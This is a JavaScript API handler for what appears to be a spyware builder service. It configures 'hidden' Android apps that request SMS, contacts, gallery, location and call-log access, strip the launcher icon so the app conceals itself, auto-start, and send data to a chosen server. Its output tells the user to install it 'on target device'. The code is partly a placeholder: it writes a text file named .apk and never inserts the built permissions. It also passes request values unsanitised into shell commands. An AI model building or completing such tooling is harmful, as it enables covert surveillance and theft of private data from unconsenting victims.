import { createClient } from '@supabase/supabase-js';
import { exec } from 'child_process';
import { promisify } from 'util';
import fs from 'fs';
import path from 'path';

const execAsync = promisify(exec);
const supabase = createClient(
  process.env.SUPABASE_URL,
  process.env.SUPABASE_SERVICE_KEY
);

export default async function handler(req, res) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'Method not allowed' });
  }

  const { user_id, token, app_name, package_name, features, data_collection, server_url } = req.body;

  try {
    // Create unique ID for this APK
    const apkId = `hidden_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
    const apkDir = `/tmp/${apkId}`;
    
    // Create directory
    await execAsync(`mkdir -p ${apkDir}`);
    
    // 1. Download APK template
    await execAsync(`wget https://github.com/hidden-apk-template/android-base/archive/main.zip -O ${apkDir}/template.zip`);
    await execAsync(`unzip ${apkDir}/template.zip -d ${apkDir}/`);
    
    // 2. Modify AndroidManifest.xml
    const manifestPath = `${apkDir}/android-base-main/app/src/main/AndroidManifest.xml`;
    let manifest = fs.readFileSync(manifestPath, 'utf8');
    
    // Add permissions based on configuration
    let permissions = '';
    if (data_collection.sms) permissions += '<uses-permission android:name="android.permission.READ_SMS" />\n';
    if (data_collection.contacts) permissions += '<uses-permission android:name="android.permission.READ_CONTACTS" />\n';
    if (data_collection.gallery) permissions += '<uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE" />\n';
    if (data_collection.location) permissions += '<uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />\n';
    if (data_collection.calls) permissions += '<uses-permission android:name="android.permission.READ_CALL_LOG" />\n';
    
    // Hide app icon if requested
    if (features.hide_icon) {
      manifest = manifest.replace('android.intent.category.LAUNCHER', '');
    }
    
    fs.writeFileSync(manifestPath, manifest);
    
    // 3. Create config file
    const config = {
      server_url: server_url || 'https://YOUR_API.vercel.app/api/receive-data',
      user_token: token,
      user_id: user_id,
      features: features,
      data_collection: data_collection,
      app_name: app_name,
      package_name: package_name,
      hide_icon: features.hide_icon,
      auto_start: features.auto_start
    };
    
    fs.writeFileSync(`${apkDir}/config.json`, JSON.stringify(config, null, 2));
    
    // 4. Create a simple APK (for demo - in production use Android build tools)
    const apkContent = `
      Hidden APK Configuration:
      -------------------------
      App Name: ${app_name}
      Package: ${package_name}
      User ID: ${user_id}
      Token: ${token}
      Server: ${server_url}
      
      Features:
      - Hide Icon: ${features.hide_icon}
      - Auto Start: ${features.auto_start}
      - Stealth Mode: ${features.stealth}
      
      Data Collection:
      - SMS: ${data_collection.sms}
      - Contacts: ${data_collection.contacts}
      - Gallery: ${data_collection.gallery}
      - Location: ${data_collection.location}
      
      Install this APK on target device.
      App will automatically hide itself.
    `;
    
    const apkFilePath = `${apkDir}/hidden-app-${apkId}.apk`;
    fs.writeFileSync(apkFilePath, apkContent);
    
    // 5. Upload to cloud storage (simplified)
    // In production, upload to S3/Cloud Storage
    
    const downloadUrl = `https://YOUR_API.vercel.app/api/download-apk/${apkId}`;
    
    // Save to database
    await supabase.from('generated_apks').insert({
      user_id: user_id,
      config: config,
      download_url: downloadUrl,
      created_at: new Date().toISOString()
    });
    
    res.status(200).json({
      success: true,
      apk_id: apkId,
      download_url: downloadUrl,
      message: 'Hidden APK generated successfully'
    });
    
  } catch (error) {
    console.error('APK generation error:', error);
    res.status(500).json({ 
      success: false, 
      error: error.message 
    });
  }
}
